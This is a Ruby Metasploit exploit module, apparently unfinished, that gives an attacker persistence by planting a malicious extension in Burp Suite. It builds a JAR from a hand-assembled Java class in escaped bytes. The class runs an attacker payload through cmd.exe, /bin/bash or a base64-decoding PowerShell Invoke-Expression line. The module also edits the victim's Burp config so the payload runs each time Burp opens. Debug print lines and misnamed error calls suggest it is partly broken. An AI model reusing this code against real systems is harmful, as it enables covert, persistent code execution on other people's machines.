##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Auxiliary::Report
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Burp Extension Persistence',
        'Description' => %q{
          This module adds a malicious extension to the Burp Suite configuration file. When burp is opened,
          the extension will be loaded and the payload will be executed.

          Tested against Burp Suite ????
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # Module
        ],
        'DisclosureDate' => '2025-01-01',
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Privileged' => false,
        'References' => [
          [ 'URL', 'https://portswigger.net/burp/documentation/desktop/extensions/creating' ]
        ],
        'Arch' => [ARCH_CMD],
        'DefaultOptions' => {
          # 25hrs, you know, just in case the user doesn't open Burp for a while
          'WfsDelay' => 90_000,
          'PrependMigrate' => true
        },
        'Payload' => {
          'BadChars' => '";\\'
        },
        'Stance' => Msf::Exploit::Stance::Passive,
        'Targets' => [
          ['Linux', { 'Platform' => 'unix' } ],
          ['Windows', { 'Platform' => 'windows' } ],
        ],
        'Notes' => {
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, CONFIG_CHANGES ]
        },
        'DefaultTarget' => 0
      )
    )

    register_options([
      OptString.new('NAME', [ false, 'Name of the extension', '' ]),
      OptString.new('CONFIG', [ true, 'Config file location on target', '' ]),
      OptString.new('WritableDir', [ true, 'A directory where we can write the extension', '' ])
    ])
  end

  def extension_name_generator
    return datastore['NAME'] unless datastore['NAME'].blank?

    rand_text_alphanumeric(4..10)
  end

  def check
    file?(datastore['config']) ? CheckCode::Detected('Config file found') : CheckCode::Safe('Config file not found')
  end

  # takes a number like 7 and makes it \x07. min_length will add \x00 padding if the value is short.
  def int_to_slash_x_number(length, min_length = 0)
    encoded = ''
    while length > 0
      byte = length & 0xFF # Extract the least significant byte
      encoded = "\\x#{byte.to_s(16).rjust(2, '0')}" + encoded # Prepend to the result
      length >>= 8 # Shift right by 8 bits
    end

    # Add padding if encoded length is less than min_length
    encoded = '\\x00' + encoded while (encoded.scan(/\\x../).size < min_length)

    encoded
  end

  def add_extension(settings_file, extension_location)
    # open file
    config_contents = read_file(settings_file)
    # store as loot for backup purposes
    path = store_loot('burp.config.json', 'application/json', session, config_contents, nil, nil)
    print_good("Config file saved in: #{path}")
    # read json
    begin
      config_contents = JSON.parse(config_contents)
    rescue JSON::ParserError
      fail_with(Failure::Unknown, "Failed to parse json config file: #{settings_file}")
    end
    malicious_extension = {
      errors: 'ui',
      extension_file: extension_location,
      extension_type: 'java',
      loaded: true,
      name: datastore['NAME'],
      output: 'ui'
    }
    config_contents['user_options']['extender']['extensions'] << malicious_extension
    # write json
    write_file(settings_file, JSON.pretty_generate(config_contents))
  end

  def run_local_gradle_build
    # Check if gradle is installed
    fails_with(Failure::NotFound, 'Gradle is not installed on this system (not target).') unless system('which gradle > /dev/null 2>&1')

    # Define source and destination directories
    src_dir = File.join(Msf::Config.data_directory, 'exploits', 'burp_extension')
    temp_dir = Dir.mktmpdir

    # Copy necessary files to the temporary directory
    FileUtils.cp_r(File.join(src_dir, 'src'), temp_dir)
    FileUtils.cp(File.join(src_dir, 'settings.gradle'), temp_dir)
    FileUtils.cp(File.join(src_dir, 'build.gradle'), temp_dir)

    # Modify burpExtension.java
    java_file = File.join(temp_dir, 'src', 'burpExtension.java')
    text = File.read(java_file)
    new_contents = text.gsub('FOOBARBAZ', payload.encoded)
                       .gsub('Metasploit Payload Extension', datastore['NAME'])
    File.open(java_file, 'w') { |file| file.puts new_contents }

    # Run gradle clean build
    Dir.chdir(temp_dir) do
      system('gradle clean build')
    end

    # Check if the jar file was created
    jar_file = File.join(temp_dir, 'build', 'libs', 'MetasploitPayloadExtension.jar')
    fails_with('Failed to create MetasploitPayloadExtension.jar') unless File.exist?(jar_file)

    File.read(jar_file)
  end

  def compiled_extension(extension_name)
    # somewhat arbitrary line breaks to make it easier to read
    puts payload.encoded
    # puts int_to_slash_x_number(extension_name.length, 2)
    # puts extension_name.length
    puts int_to_slash_x_number(payload.encoded.length, 2)
    puts payload.encoded.length

    burp_extension_class = "\xca\xfe\xba\xbe\x00\x00\x008\x00\x81\x0a\x00\x02\x00\x03\x07\x00\x04\x0c\x00\x05\x00\x06\x01\x00\x10java/lang/Object\x01\x00\x06<init>\x01\x00\x03()V\x08\x00\x08\x01"
    burp_extension_class << int_to_slash_x_number(extension_name.length, 2) # extension name length
    burp_extension_class << extension_name # extension name
    burp_extension_class << "\x0b\x00\x0a\x00\x0b\x07\x00\x0c\x0c\x00\x0d\x00\x0e\x01\x00\x1bburp/IBurpExtenderCallbacks\x01\x00\x10setExtensionName\x01\x00\x15(Ljava/lang/String;)V\x08\x00\x10"
    # smaller payloads (400ish in size) don't have this byte, larger payloads like 800 do. not sure why though
    burp_extension_class << "\x01"
    burp_extension_class << int_to_slash_x_number(payload.encoded.length, 2) # payload length, 2 bytes \xNN\xNN
    burp_extension_class << payload.encoded # payload
    burp_extension_class << "\x07\x00\x12\x01\x00\x13java/io/PrintWriter\x0b\x00\x0a\x00\x14\x0c\x00\x15\x00\x16\x01\x00\x09getStdout\x01\x00\x18()Ljava/io/OutputStream;\x0a\x00\x11\x00\x18\x0c\x00"
    burp_extension_class << "\x05\x00\x19\x01\x00\x1a(Ljava/io/OutputStream;Z)V\x0b\x00\x0a\x00\x1b\x0c\x00\x1c\x00\x16\x01\x00\x09getStderr\x08\x00\x1e\x01\x00\x07os.name\x0a\x00 \x00!\x07\x00\"\x0c"
    burp_extension_class << "\x00#\x00$\x01\x00\x10java/lang/System\x01\x00\x0bgetProperty\x01\x00&(Ljava/lang/String;)Ljava/lang/String;\x0a\x00&\x00'\x07\x00(\x0c\x00)\x00*\x01\x00\x10java/lang/String"
    burp_extension_class << "\x01\x00\x0btoLowerCase\x01\x00\x14()Ljava/lang/String;\x08\x00,\x01\x00\x17Initializing extension.\x0a\x00\x11\x00.\x0c\x00/\x00\x0e\x01\x00\x07println\x08\x001\x01\x00"
    burp_extension_class << "\x03win\x0a\x00&\x003\x0c\x004\x005\x01\x00\x08contains\x01\x00\x1b(Ljava/lang/CharSequence;)Z\x12\x00\x00\x007\x0c\x008\x00$\x01\x00\x17makeConcatWithConstants\x0a\x00:\x00"
    burp_extension_class << ";\x07\x00<\x0c\x00=\x00>\x01\x00\x11java/lang/Runtime\x01\x00\x0agetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x08\x00@\x01\x00\x07cmd.exe\x08\x00B\x01\x00\x02/c\x0a\x00:\x00"
    burp_extension_class << "D\x0c\x00E\x00F\x01\x00\x04exec\x01\x00(([Ljava/lang/String;)Ljava/lang/Process;\x08\x00H\x01\x00\x09/bin/bash\x08\x00J\x01\x00\x02-c\x08\x00L\x01\x00"
    burp_extension_class << " Finished initializing extension.\x07\x00N\x01\x00\x13java/lang/Exception\x0a\x00M\x00P\x0c\x00Q\x00*\x01\x00\x0agetMessage\x12\x00\x01\x007\x07\x00T\x01\x00"
    burp_extension_class << "\x11burp/BurpExtender\x07\x00V\x01\x00\x12burp/IBurpExtender\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00"
    burp_extension_class << "\x13Lburp/BurpExtender;\x01\x00\x19registerExtenderCallbacks\x01\x00 (Lburp/IBurpExtenderCallbacks;)V\x01\x00\x0ewindowsCommand\x01\x00\x12Ljava/lang/String;\x01\x00"
    burp_extension_class << "\x07process\x01\x00\x13Ljava/lang/Process;\x01\x00\x01e\x01\x00\x15Ljava/lang/Exception;\x01\x00\x09callbacks\x01\x00\x1dLburp/IBurpExtenderCallbacks;\x01\x00\x07command\x01\x00"
    burp_extension_class << "\x06stdout\x01\x00\x15Ljava/io/PrintWriter;\x01\x00\x06stderr\x01\x00\x02os\x01\x00\x0dStackMapTable\x07\x00m\x01\x00\x11java/lang/Process\x01\x00\x0aSourceFile\x01\x00"
    burp_extension_class << "\x11BurpExtender.java\x01\x00\x10BootstrapMethods\x08\x00r\x01\x00ipowershell.exe -Command \"\x01[Convert]::FromBase64String | ForEach-Object {$_ -join ''} | Invoke-Expression\""
    burp_extension_class << "\x08\x00t\x01\x00\x1aError loading extension: \x01\x0f\x06\x00v\x0a\x00w\x00x\x07\x00y\x0c\x008\x00z\x01\x00$java/lang/invoke/StringConcatFactory\x01"
    burp_extension_class << "\x00\x98(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/invoke/CallSite;\x01"
    burp_extension_class << "\x00\x0cInnerClasses\x07\x00}\x01\x00%java/lang/invoke/MethodHandles$Lookup\x07\x00\x7f\x01\x00\x1ejava/lang/invoke/MethodHandles\x01\x00\x06Lookup\x00!\x00S\x00\x02\x00\x01"
    burp_extension_class << "\x00U\x00\x00\x00\x02\x00\x01\x00\x05\x00\x06\x00\x01\x00W\x00\x00\x00/\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x01\xb1\x00\x00\x00\x02\x00X\x00\x00\x00\x06\x00\x01\x00\x00"
    burp_extension_class << "\x00\x06\x00Y\x00\x00\x00\x0c\x00\x01\x00\x00\x00\x05\x00Z\x00[\x00\x00\x00\x01\x00\\\x00]\x00\x01\x00W\x00\x00\x01\xab\x00\x05\x00\x08\x00\x00\x00\x9f+\x12\x07\xb9\x00\x09\x02"
    burp_extension_class << "\x00\x12\x0fM\xbb\x00\x11Y+\xb9\x00\x13\x01\x00\x04\xb7\x00\x17N\xbb\x00\x11Y+\xb9\x00\x1a\x01\x00\x04\xb7\x00\x17:\x04\x12\x1d\xb8\x00\x1f\xb6\x00%:\x05-\x12+\xb6\x00-\x19\x05"
    burp_extension_class << "\x120\xb6\x002\x99\x00),\xba\x006\x00\x00:\x07\xb8\x009\x06\xbd\x00&Y\x03\x12?SY\x04\x12ASY\x05\x19\x07S\xb6\x00C:\x06\xa7\x00\x1d\xb8\x009\x06\xbd\x00&Y\x03\x12GSY\x04\x12ISY"
    burp_extension_class << "\x05,S\xb6\x00C:\x06-\x12K\xb6\x00-\xa7\x00\x14:\x07\x19\x04\x19\x07\xb6\x00O\xba\x00R\x00\x00\xb6\x00-\xb1\x00\x01\x004\x00\x8a\x00\x8d\x00M\x00\x03\x00X\x00\x00\x00B\x00\x10"
    burp_extension_class << "\x00\x00\x00\x0b\x00\x08\x00\x0e\x00\x0b\x00\x11\x00\x1a\x00\x12\x00*\x00\x15\x004\x00\x19\x00:\x00\x1b\x00D\x00\x1d\x00L\x00!\x00g\x00\"\x00j\x00$\x00\x84\x00&\x00\x8a\x00)\x00"
    burp_extension_class << "\x8d\x00'\x00\x8f\x00(\x00\x9e\x00*\x00Y\x00\x00\x00f\x00\x0a\x00L\x00\x1b\x00^\x00_\x00\x07\x00g\x00\x03\x00`\x00a\x00\x06\x00\x84\x00\x09\x00`\x00a\x00\x06\x00\x8f\x00\x0f\x00b"
    burp_extension_class << "\x00c\x00\x07\x00\x00\x00\x9f\x00Z\x00[\x00\x00\x00\x00\x00\x9f\x00d\x00e\x00\x01\x00\x0b\x00\x94\x00f\x00_\x00\x02\x00\x1a\x00\x85\x00g\x00h\x00\x03\x00*\x00u\x00i\x00h\x00\x04"
    burp_extension_class << "\x004\x00k\x00j\x00_\x00\x05\x00k\x00\x00\x00>\x00\x04\xff\x00j\x00\x06\x07\x00S\x07\x00\x0a\x07\x00&\x07\x00\x11\x07\x00\x11\x07\x00&\x00\x00\xfc\x00\x19\x07\x00l\xff\x00\x08"
    burp_extension_class << "\x00\x06\x07\x00S\x07\x00\x0a\x07\x00&\x07\x00\x11\x07\x00\x11\x07\x00&\x00\x01\x07\x00M\x10\x00\x03\x00n\x00\x00\x00\x02\x00o\x00p\x00\x00\x00\x0e\x00\x02\x00u\x00\x01\x00q\x00u"
    burp_extension_class << "\x00\x01\x00s\x00{\x00\x00\x00\x0a\x00\x01\x00|\x00~\x00\x80\x00\x19"

    jar = Rex::Zip::Jar.new
    # build our manifest manually because its only one line and we don't need the extra
    # lines that build_manifest adds. This more closely implements the gradle build command
    jar.add_file('META-INF/', '')
    jar.add_file('META-INF/MANIFEST.MF', "Manifest-Version: 1.0\r\n\r\n")
    jar.add_file('burp/', '')
    jar.add_file('burp/BurpExtender.class', burp_extension_class)

    jar
  end

  def exploit
    fail_with(Failure::NotFound, "Config file not found: #{datastore['config']}") unless file?(datastore['config'])
    extension_name = extension_name_generator
    print_status("Using extension name: #{extension_name}")
    extension_location = "#{datastore['WritableDir']}/#{extension_name}.jar"
    vprint_status("Writing malcious extension to disk: #{extension_location}")
    write_file(extension_location, compiled_extension(extension_name))
    register_files_for_cleanup(extension_location)
    vprint_status('Updating config file')
    add_extension(datastore['CONFIG'], extension_location)

    print_good('Extension enabled, waiting for Burp to open with the config.')
  end
end
